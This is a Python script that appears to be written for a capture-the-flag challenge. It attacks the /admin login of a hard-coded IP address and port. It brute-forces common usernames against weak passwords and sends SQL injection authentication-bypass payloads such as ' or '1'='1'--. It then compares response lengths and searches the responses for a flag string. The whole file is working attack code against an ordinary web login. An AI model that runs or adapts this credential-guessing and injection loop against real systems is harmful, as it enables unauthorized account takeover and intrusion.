import urllib.request, urllib.parse, http.cookiejar, re

BASE = "http://103.163.47.230:33662"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]


def req(p, data=None, method=None):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    h = {"Content-Type": "application/x-www-form-urlencoded"} if body else {}
    r = urllib.request.Request(BASE + p, data=body, headers=h, method=method)
    try:
        resp = op.open(r, timeout=20)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def clean(b):
    b = re.sub(r"<style.*?</style>", "", b, flags=re.S)
    b = re.sub(r"<script.*?</script>", "", b, flags=re.S)
    return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", b)).strip()


base_len = None
s, b = req("/admin")
base_len = len(b)
print("GET /admin len", base_len)

USERS = ["admin", "administrator", "obsidian", "root", "lab", "user", "manager", "operator"]
PWDS = ["admin", "admin123", "password", "123456", "obsidian", "obsidian123",
        "lab", "root", "12345678", "letmein", "welcome", "secret", "P@ssw0rd",
        "admin@123", "Admin123", "000000", "111111", "abcd1234", "pass", "test"]
INJ = ["admin'--", "admin' -- ", "admin'#", "admin' or '1'='1'--", "admin' or 1=1--",
       "' or '1'='1'--", "\" or \"1\"=\"1\"--", "admin'/**/or/**/1=1--",
       "' or 1=1#", "admin')or('1'='1'--", "admin' or 'a'='a"]

seen = set()
for u in USERS + INJ:
    for pw in PWDS + ["' or '1'='1", "x'or'1'='1"]:
        key = (u, pw)
        if key in seen:
            continue
        seen.add(key)
        cj.clear()
        s, b = req("/admin", {"username": u, "password": pw}, "POST")
        t = clean(b)
        if len(b) != base_len or "管理控制台" not in b:
            print(f"** DIFF u={u!r} pw={pw!r} status={s} len={len(b)}")
            print("   ", t[:300])
            if "flag" in b.lower() or "HTUCTF" in b:
                print("   !!!FLAG!!!")
                print(b[:3000])
        # 只在首次看到差异时打印
    print(f"  done {u!r}")
